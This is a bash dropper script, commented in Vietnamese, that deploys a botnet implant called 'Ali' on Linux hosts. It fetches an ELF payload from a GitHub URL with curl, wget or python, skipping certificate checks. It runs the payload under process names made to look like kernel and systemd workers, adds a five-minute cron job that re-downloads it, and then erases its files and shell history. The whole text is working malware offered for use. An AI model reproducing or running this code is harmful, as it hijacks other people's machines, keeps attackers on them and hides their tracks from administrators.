#!/usr/bin/env bash

URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/Ali"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

IS_ROOT=0
[ "$(id -u)" = "0" ] && IS_ROOT=1

find_work_dir() {
    local candidates=(
        "/dev/shm"
        "/run/user/$(id -u)"
        "/tmp"
        "/var/tmp"
        "$HOME/.cache"
        "$HOME/.local/share"
        "/var/www/html"
        "/opt"
    )
    candidates+=("$(pwd)")

    if command -v findmnt >/dev/null 2>&1; then
        while IFS= read -r mnt; do
            [ -n "$mnt" ] && candidates+=("$mnt")
        done < <(timeout 2 findmnt -n -o TARGET 2>/dev/null | grep -v -E '^/(proc|sys|dev/pts)')
    else
        while IFS= read -r mnt; do
            [ -n "$mnt" ] && candidates+=("$mnt")
        done < <(timeout 2 mount 2>/dev/null | awk '{for(i=3;i<=NF;i++) printf "%s%s", $i, (i==NF?ORS:OFS)}' | grep -v -E '^/(proc|sys|dev/pts)')
    fi

    for base in "${candidates[@]}"; do
        [ -z "$base" ] && continue
        [ -d "$base" ] || continue
        [ -w "$base" ] || continue
        
        local avail=$(timeout 1 df -Pk "$base" 2>/dev/null | awk 'NR==2 {print $4}')
        [ "${avail:-0}" -lt 10240 ] && continue

        local tdir="$base/.sys"
        if mkdir -p "$tdir" 2>/dev/null && [ -w "$tdir" ]; then
            local tbin="$tdir/.wtest"
            echo '#!/bin/sh' > "$tbin" 2>/dev/null
            echo 'exit 0' >> "$tbin" 2>/dev/null
            chmod +x "$tbin" 2>/dev/null
            
            if timeout 1 "$tbin" >/dev/null 2>&1; then
                rm -f "$tbin"
                echo "$tdir"
                return 0
            fi
            rm -f "$tbin"
        fi
    done
    return 1
}

# FIX: Hàm kiểm tra file ELF (giống hàm is_gzip của KameHa)
is_elf() {
    [ -s "$1" ] || return 1
    local magic
    magic="$(head -c 4 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
    [ "$magic" = "7f454c46" ] # Magic bytes của file thực thi Linux ELF
}

dl() {
    local url="$1"
    local out="$2"
    rm -f "$out"

    if command -v curl >/dev/null 2>&1; then
        # Thêm timeout, retry mạnh hơn
        curl -fsSL --retry 2 --connect-timeout 10 --max-time 60 -A "$UA" "$url" -o "$out" 2>/dev/null && is_elf "$out" && return 0
        curl -fsSLk --retry 2 --connect-timeout 10 --max-time 60 -A "$UA" "$url" -o "$out" 2>/dev/null && is_elf "$out" && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -qT 10 --tries=2 -U "$UA" -O "$out" "$url" 2>/dev/null && is_elf "$out" && return 0
        wget -qT 10 --tries=2 --no-check-certificate -U "$UA" -O "$out" "$url" 2>/dev/null && is_elf "$out" && return 0
    fi
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import sys, urllib.request, ssl
req = urllib.request.Request(sys.argv[2], headers={'User-Agent': sys.argv[3]})
ctx = ssl._create_unverified_context()
with urllib.request.urlopen(req, context=ctx, timeout=15) as r, open(sys.argv[1], 'wb') as f:
    f.write(r.read())
" "$out" "$url" "$UA" 2>/dev/null && is_elf "$out" && return 0
    fi
    rm -f "$out"
    return 1
}

# Hàm thực thi Bot
run_bot() {
    local bin_path="$1"
    if [ ! -x "$bin_path" ]; then return 1; fi
    
    # Dọn dẹp lock cũ
    rm -f /tmp/.sys-lock-v2 /tmp/.sys-lock /tmp/.client.lock 2>/dev/null
    
    # Chạy bot
    nohup setsid "$bin_path" -d < /dev/null > /dev/null 2>&1 &
    disown
    sleep 2
    
    # Kiểm tra xem bot đã lên chưa
    if pgrep -f "kworker/0:1H-kblockd" >/dev/null 2>&1 || pgrep -f "systemd-networkd-helper" >/dev/null 2>&1 || pgrep -f "systemd-journald-helper" >/dev/null 2>&1; then
        return 0
    fi
    return 1
}

echo "[*] Deploying Ali Implant (Root: $IS_ROOT)..."

DIR=$(timeout 10 bash -c "$(declare -f find_work_dir); find_work_dir")
if [ -z "$DIR" ]; then
    echo "[-] CRITICAL: No writable and executable directory found."
    exit 1
fi

echo "[+] Selected directory: $DIR"
BIN="$DIR/Ali"

echo "[*] Downloading Ali payload..."
SUCCESS=0
for i in 1 2 3; do
    dl "$URL" "$BIN" && SUCCESS=1 && break
    [ "$i" -lt 3 ] && sleep 2
done

if [ "$SUCCESS" -eq 0 ]; then
    echo "[-] Download failed or file corrupted (not ELF)."
    exit 1
fi

chmod +x "$BIN"

echo "[*] Executing Ali..."
if ! run_bot "$BIN"; then
    echo "[-] WARNING: Process failed to start immediately."
    # Cố gắng chạy trực tiếp để lấy log lỗi
    echo "--- Debug Output ---"
    timeout 5 "$BIN" -d
    echo "--------------------"
fi

# ==========================================================
# FIX QUAN TRỌNG: TẠO CRONJOB DỰ PHÒNG (Giống KameHa)
# Cứ 5 phút, nếu bot chết, tự động tải lại và chạy
# ==========================================================
PERSIST_SCRIPT="$DIR/.persist.sh"
cat > "$PERSIST_SCRIPT" << 'EOF_PERSIST'
#!/usr/bin/env bash
if pgrep -f "kworker/0:1H-kblockd" >/dev/null 2>&1 || pgrep -f "systemd-networkd-helper" >/dev/null 2>&1; then
    exit 0 # Bot vẫn sống, không cần làm gì
fi
# Nếu bot chết, thử tải và chạy lại
URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/Ali"
BIN="/tmp/.sys/.persist_bin"
mkdir -p /tmp/.sys
if command -v curl >/dev/null 2>&1; then
    curl -fsSL -A "Mozilla/5.0" "$URL" -o "$BIN" 2>/dev/null
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$BIN" "$URL" 2>/dev/null
fi
if [ -s "$BIN" ]; then
    chmod +x "$BIN"
    rm -f /tmp/.sys-lock-v2
    nohup setsid "$BIN" -d < /dev/null > /dev/null 2>&1 &
    disown
fi
rm -f "$BIN"
EOF_PERSIST
chmod +x "$PERSIST_SCRIPT"

# Thêm vào cron (nếu có)
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "$PERSIST_SCRIPT"; echo "*/5 * * * * $PERSIST_SCRIPT >/dev/null 2>&1") | crontab - 2>/dev/null
fi

# Xóa file tải gốc để giấu vết
rm -f "$BIN" 2>/dev/null
rm -rf "$DIR" 2>/dev/null

echo "[*] Done. Ali executed and backup persistence installed."

if [ "$IS_ROOT" -eq 1 ]; then
    history -c 2>/dev/null || true
    unset HISTFILE
    [ -f "$HOME/.bash_history" ] && cat /dev/null > "$HOME/.bash_history" 2>/dev/null || true
fi

exit 0
